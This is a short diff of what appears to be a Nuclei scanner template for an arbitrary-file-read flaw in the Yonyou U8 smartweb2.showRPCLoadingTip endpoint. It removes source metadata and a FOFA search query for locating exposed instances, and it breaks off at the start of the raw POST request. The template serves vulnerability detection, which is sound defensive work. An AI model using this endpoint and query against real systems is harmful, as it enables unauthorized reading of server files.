@@ -3,12 +3,8 @@ info:
   name: 用友U8平台-smartweb2_showRPCLoadingTip-任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gwv5hbxwbfzo749n'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gwv5hbxwbfzo749n
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'POST /hrss/dorado/smartweb2.showRPCLoadingTip.d?skin=default&__rpc=true&windows=1 HTTP/1.1
